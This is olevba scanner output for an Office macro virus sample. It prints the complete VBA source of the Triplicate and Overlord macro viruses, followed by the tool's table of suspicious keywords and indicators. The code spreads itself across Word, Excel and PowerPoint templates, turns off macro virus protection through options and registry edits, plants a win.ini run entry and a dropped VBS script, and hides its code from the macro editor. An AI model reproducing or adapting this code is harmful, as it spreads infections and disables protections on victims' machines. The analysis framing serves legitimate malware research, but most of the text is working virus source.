olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Triplicate.c-f27a2fa708f5ef67c6e7f155f0ba81a986ea676c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Triplicate.c-f27a2fa708f5ef67c6e7f155f0ba81a986ea676c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'<!--1nternal-->
'Triplicate v0.21 /1nternal
Private Sub Document_Close()
    On Error Resume Next
    Options.VirusProtection = False
    Options.ConfirmConversions = False
    Options.SaveNormalPrompt = False
    Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
    Set TT = Templates(1).VBProject.VBComponents(1).CodeModule
    Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
    If AD.Lines(1, 1) <> "'<!--1nternal-->" Then
        AD.DeleteLines 1, AD.CountOfLines
        AD.InsertLines 1, TT.Lines(1, TT.CountOfLines)
        If AD.Lines(1, 1) <> "'<!--1nternal-->" Then
            AD.InsertLines 1, NT.Lines(1, NT.CountOfLines)
        End If
    End If
    If NT.Lines(1, 1) <> "'<!--1nternal-->" Then
        NT.DeleteLines 1, NT.CountOfLines
        NT.InsertLines 1, AD.Lines(1, AD.CountOfLines)
        Set xlApp = CreateObject("Excel.Application")
        If UCase(Dir(xlApp.Application.StartupPath + "\Book1.")) <> UCase("BOOK1") Then
            System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = "Check"
            System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = ""
            System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = "Whoa"
            Set Book1Obj = xlApp.Workbooks.Add
            Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, NT.Lines(1, NT.CountOfLines)
            Book1Obj.SaveAs xlApp.Application.StartupPath & "\Book1."
            Book1Obj.Close
        End If
        xlApp.Quit
        Set PPObj = CreateObject("PowerPoint.Application")
        Set PBT = PPObj.Presentations.Open(Application.Path + "\..\Templates\Blank Presentation.pot", , , msoFalse)
        For Each ModComponent In PBT.VBProject.VBComponents
            If ModComponent.Name = "Triplicate" Then dontadd = True
        Next
        If dontadd <> True Then
            System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\PowerPoint\Options", "MacroVirusProtection") = ""
            System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\8.0\New User Settings\PowerPoint\Options", "MacroVirusProtection") = ""
            System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\PowerPoint\Options", "MacroVirusProtection") = ""
            Set NewMod = PBT.VBProject.VBComponents.Add(1)
            NewMod.Name = "Triplicate"
            NewMod.CodeModule.InsertLines 1, NT.Lines(1, NT.CountOfLines)
            NewMod.CodeModule.ReplaceLine 118, "Sub actionhook(tristate)"
            Set ShapetoWack = PBT.SlideMaster.Shapes.AddShape(1, 0, 0, PBT.PageSetup.SlideWidth, PBT.PageSetup.SlideHeight)
            With ShapetoWack
                .Name = "Triplicate"
                .ZOrder (1)
                .Line.Visible = False
                .Fill.Visible = False
                .ActionSettings(1).Action = 8
                .ActionSettings(1).Run = "actionhook"
            End With
            Set NewMod = Nothing
            PBT.Save
        End If
        PBT.Close
        PPObj.Quit
    End If
    If TT.Lines(1, 1) <> "'<!--1nternal-->" Then
        TT.DeleteLines 1, TT.CountOfLines
        TT.InsertLines 1, NT.Lines(1, NT.CountOfLines)
    End If
End Sub
Private Sub Workbook_Deactivate()
    On Error Resume Next
    Set AW = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
    Set TW = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
    If UCase(Dir(Application.StartupPath + "\Book1.")) <> "BOOK1" Then
        Set WordObj = GetObject(, "Word.Application")
        If WordObj = "" Then
            Set WordObj = CreateObject("Word.Application")
            WQuit = True
        End If
        Set NT = WordObj.NormalTemplate.VBProject.VBComponents(1).CodeModule
        WordObj.Options.SaveNormalPrompt = False
        NT.InsertLines 1, "Public Sub DisableAV()" + Chr(13) + Chr(10) + TW.Lines(23, 3) + Chr(13) + Chr(10) + TW.Lines(38, 3) + Chr(13) + Chr(10) + "End Sub"
        WordObj.Run "Normal.ThisDocument.DisableAV"
        NT.DeleteLines 1, NT.CountOfLines
        NT.InsertLines 1, TW.Lines(1, TW.CountOfLines)
        Set NT = Nothing
        If WQuit = True Then WordObj.Quit
        Set PPObj = CreateObject("PowerPoint.Application")
        Set PBT = PPObj.Presentations.Open(Application.Path + "\..\Templates\Blank Presentation.pot", , , msoFalse)
        For Each ModComponent In PBT.VBProject.VBComponents
            If ModComponent.Name = "Triplicate" Then dontadd = True
        Next
        If dontadd <> True Then
            Set NewMod = PBT.VBProject.VBComponents.Add(1)
            NewMod.Name = "Triplicate"
            NewMod.CodeModule.InsertLines 1, TW.Lines(1, TW.CountOfLines)
            NewMod.CodeModule.ReplaceLine 118, "Sub actionhook(tristate)"
            Set ShapetoWack = PBT.SlideMaster.Shapes.AddShape(1, 0, 0, PBT.PageSetup.SlideWidth, PBT.PageSetup.SlideHeight)
            With ShapetoWack
                .Name = "Triplicate"
                .ZOrder (1)
                .Line.Visible = False
                .Fill.Visible = False
                .ActionSettings(1).Action = 8
                .ActionSettings(1).Run = "actionhook"
            End With
            Set NewMod = Nothing
            PBT.Save
        End If
        PBT.Close
        PPObj.Quit
        Set xlApp = CreateObject("Excel.Application")
        Set Book1Obj = xlApp.Workbooks.Add
        Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, TW.Lines(1, TW.CountOfLines)
        Book1Obj.SaveAs FileName:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
        Book1Obj.Close
        xlApp.Quit
    End If
    If AW.Lines(1, 1) <> "'<!--1nternal-->" Then
        AW.InsertLines 1, TW.Lines(1, TW.CountOfLines)
    End If
End Sub
Private Sub actionhook(tristate)
    On Error Resume Next
    If Int(Rnd * 7) = 0 Then
        Set Home = ActivePresentation
        If UCase(Dir(Application.Path + "\Xlstart\Book1.")) <> UCase("BOOK1") Then
            Set WordObj = GetObject(, "Word.Application")
            If WordObj = "" Then
                Set WordObj = CreateObject("Word.Application")
                WQuit = True
            End If
            Set NT = WordObj.NormalTemplate.VBProject.VBComponents(1).CodeModule
            WordObj.Options.SaveNormalPrompt = False
            NT.InsertLines 1, "Public Sub DisableAV()" + Chr(13) + Chr(10) + Home.VBProject.VBComponents("Triplicate").CodeModule.Lines(23, 3) + Chr(13) + Chr(10) + Home.VBProject.VBComponents("Triplicate").CodeModule.Lines(38, 3) + Chr(13) + Chr(10) + "End Sub"
            WordObj.Run "Normal.ThisDocument.DisableAV"
            NT.DeleteLines 1, NT.CountOfLines
            NT.InsertLines 1, Home.VBProject.VBComponents("Triplicate").CodeModule.Lines(1, Home.VBProject.VBComponents("Triplicate").CodeModule.CountOfLines)
            NT.ReplaceLine 118, "Private Sub actionhook(tristate)"
            Set NT = Nothing
            If WQuit = True Then WordObj.Quit
            Set xlApp = CreateObject("Excel.Application")
            Set Book1Obj = xlApp.Workbooks.Add
            Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, Home.VBProject.VBComponents("Triplicate").CodeModule.Lines(1, Home.VBProject.VBComponents("Triplicate").CodeModule.CountOfLines)
            Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.ReplaceLine 118, "Private Sub actionhook(tristate)"
            Book1Obj.SaveAs xlApp.Application.StartupPath & "\Book1."
            Book1Obj.Close
            xlApp.Quit
            Set PBT = Presentations.Open(Application.Path + "\..\Templates\Blank Presentation.pot", , , msoFalse)
            dontadd = False
            For Each ModComponent In PBT.VBProject.VBComponents
                If ModComponent.Name = "Triplicate" Then dontadd = True
            Next
            If dontadd <> True Then
                Set NewMod = PBT.VBProject.VBComponents.Add(1)
                NewMod.Name = "Triplicate"
                NewMod.CodeModule.InsertLines 1, Home.VBProject.VBComponents("Triplicate").CodeModule.Lines(1, Home.VBProject.VBComponents("Triplicate").CodeModule.CountOfLines)
                Set ShapetoWack = PBT.SlideMaster.Shapes.AddShape(1, 0, 0, PBT.PageSetup.SlideWidth, PBT.PageSetup.SlideHeight)
                With ShapetoWack
                    .Name = "Triplicate"
                    .ZOrder (1)
                    .Line.Visible = False
                    .Fill.Visible = False
                    .ActionSettings(1).Action = 8
                    .ActionSettings(1).Run = "actionhook"
                End With
                PBT.Save
            End If
            PBT.Close
        End If
    End If
    ActivePresentation.SlideShowWindow.View.Next
End Sub
-------------------------------------------------------------------------------
VBA MACRO Module.bas 
in file: Virus.MSOffice.Triplicate.c-f27a2fa708f5ef67c6e7f155f0ba81a986ea676c - OLE stream: 'Macros/VBA/Module'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()

'MyName = Overlord
'WrittenBy = f0re [UC/Skamwerks/DVC]
'Version = .B (1.1)

On Error Resume Next

windir = Environ("windir")
If Dir(windir & "\tempad.dll") <> "" Then Kill (windir & "\tempad.dll")
If Dir(windir & "\tempnt.dll") <> "" Then Kill (windir & "\tempnt.dll")

Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False

If NormalTemplate.VBProject.VBComponents.Item("Module").CodeModule.Lines(3, 1) <> "'MyName = Overlord" Then
ActiveDocument.VBProject.VBComponents("Module").Export (windir & "\tempad.dll")
NormalTemplate.VBProject.VBComponents.import (windir & "\tempad.dll")
NormalTemplate.Save
End If
If ActiveDocument.VBProject.VBComponents.Item("Module").CodeModule.Lines(3, 1) <> "'MyName = Overlord" Then
NormalTemplate.VBProject.VBComponents("Module").Export (windir & "\tempnt.dll")
ActiveDocument.VBProject.VBComponents.import (windir & "\tempnt.dll")
ActiveDocument.SaveAs ActiveDocument.FullName
End If

If Dir("c:\Himem.sys") <> "" Then
Open "c:\Himem.sys" For Input As #1
Open "c:\Himem.sy_" For Output As #2
Do While Not EOF(1)
 Input #1, Line
 If Line <> ActiveDocument.FullName Then Print #2, Line
Loop
Close #1
Close #2

Kill ("c:\Himem.sys")
FileCopy "c:\Himem.sy_", "c:\Himem.sys"
Kill ("c:\Himem.sy_")
End If

End Sub
Sub AutoOpen()

On Error Resume Next
windir = Environ("windir")

Open "c:\Himem.sys" For Append As #1
Print #1, ActiveDocument.FullName
Close #1

End Sub

Sub Stealth()
On Error Resume Next

windir = Environ("windir")

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\software\", "RegisteredOwner") = "the Overlord"

Open windir & "\win.ini" For Input As #1
Open "c:\win._ni" For Output As #2
Do While Not EOF(1)
 Line Input #1, Line
 If Line = "[windows]" Then
  Print #2, Line
  Print #2, "run = " & windir & "\overlord.b.vbs"
 Else
  Print #2, Line
 End If
Loop
Close #1
Close #2

FileCopy "c:\win._ni", windir & "\win.ini"
Kill ("c:\win._ni")

If Dir(windir & "\overlord.b.vbs") <> "" Then Kill (windir & "\overlord.b.vbs")

Open "c:\windows\overlord.b.vbs" For Append As #1
Print #1, "On error resume next"
Print #1, ""
Print #1, "Set WordObj = CreateObject(" & Chr(34) & "Word.Application" & Chr(34) & ")"
Print #1, "WordObj.Options.SaveNormalPrompt = False"
Print #1, "WordObj.NormalTemplate.VBProject.VBComponents.remove WordObj.NormalTemplate.VBProject.VBComponents(" & Chr(34) & "Module" & Chr(34) & ")"
Print #1, "WordObj.NormalTemplate.save"
Print #1, "WordObj.NormalTemplate.VBProject.VBComponents.import (" & Chr(34) & windir & "\overlord.b.dll" & Chr(34) & ")"
Print #1, "WordObj.NormalTemplate.save"
Print #1, ""
Print #1, "Dim FSO"
Print #1, "Set FSO = CreateObject(" & Chr(34) & "Scripting.FileSystemObject" & Chr(34) & ")"
Print #1, "set a =  FSO.OpenTextFile(" & Chr(34) & "c:\himem.sys" & Chr(34) & ", 1, True)"
Print #1, "contents = a.readall()"
Print #1, "a.close"
Print #1, "set b =  FSO.OpenTextFile(" & Chr(34) & "c:\himem.dll" & Chr(34) & ", 2, True)"
Print #1, "b.write(contents)"
Print #1, "b.close"
Print #1, "set a =  FSO.OpenTextFile(" & Chr(34) & "c:\himem.dll" & Chr(34) & ", 1, True)"
Print #1, "Do While a.atendofstream <> True"
Print #1, "documentname = a.readline"
Print #1, "If documentname <> " & Chr(34) & Chr(34) & " then"
Print #1, "WordObj.Documents.open (documentname)"
Print #1, "WordObj.activedocument.save"
Print #1, "WordObj.activedocument.close"
Print #1, "End if"
Print #1, "Loop"
Print #1, "a.close"
Print #1, "set NT = " & Chr(34) & Chr(34)
Print #1, "WordObj.Quit"
Print #1, "fso.deletefile" & Chr(34) & "c:\himem.sys" & Chr(34)
Print #1, "fso.deletefile" & Chr(34) & "c:\himem.dll" & Chr(34)
Close #1

NormalTemplate.VBProject.VBComponents("Module").Export (windir & "\overlord.b.dll")

End Sub
Sub ViewVBCode()
On Error Resume Next

Call Stealth

NormalTemplate.VBProject.VBComponents("Module").CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents("Module").CodeModule.CountOfLines
NormalTemplate.Saved = True
NormalTemplate.VBProject.VBComponents.Remove NormalTemplate.VBProject.VBComponents("Module")
NormalTemplate.Saved = True

Docnumber = Application.Documents.Count
If Docnumber >= 1 Then
For x = 1 To Docnumber
Documents(x).VBProject.VBComponents("Module").CodeModule.DeleteLines 1, Documents(x).VBProject.VBComponents("Module").CodeModule.CountOfLines
Documents(x).Saved = True
Documents(x).VBProject.VBComponents.Remove Documents(x).VBProject.VBComponents("Module")
Documents(x).Saved = True
Next x
End If

Application.ShowVisualBasicEditor = True

End Sub
Sub ToolsMacro()
On Error Resume Next

For x = 1 To NormalTemplate.VBProject.VBComponents("Module").CodeModule.CountOfLines
 codeNT = codeNT & NormalTemplate.VBProject.VBComponents("Module").CodeModule.Lines(x, 1) & Chr(13)
Next x
NormalTemplate.VBProject.VBComponents("Module").CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents("Module").CodeModule.CountOfLines
NormalTemplate.Saved = True

Docnumber = Application.Documents.Count
If Docnumber >= 1 Then
 For y = 1 To ActiveDocument.VBProject.VBComponents("Module").CodeModule.CountOfLines
  CodeAD = CodeAD & ActiveDocument.VBProject.VBComponents("Module").CodeModule.Lines(y, 1) & Chr(13)
 Next y
 For x = 1 To Docnumber
 Documents(x).VBProject.VBComponents("Module").CodeModule.DeleteLines 1, Documents(x).VBProject.VBComponents("Module").CodeModule.CountOfLines
 Documents(x).Saved = True
 Next x
End If

Application.Dialogs(wdDialogToolsMacro).Show

If Application.ShowVisualBasicEditor = False Then
 NormalTemplate.VBProject.VBComponents("Module").CodeModule.InsertLines 1, codeNT
 NormalTemplate.Save
 
If Docnumber >= 1 Then
For x = 1 To Docnumber
Documents(x).VBProject.VBComponents("Module").CodeModule.InsertLines 1, CodeAD
Documents(x).SaveAs Documents(x).FullName
Next x
End If
End If
End Sub

'Put this code in a module called "Module". This is another version of overlord.
'It uses a different stealth mechanism. Again however not perfect stealth,
'but perhaps also a nice attempt i hope :).




+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |tempad.dll          |Executable file name                         |
|IOC       |tempnt.dll          |Executable file name                         |
|IOC       |b.vbs               |Executable file name                         |
|IOC       |b.dll               |Executable file name                         |
|IOC       |himem.dll           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

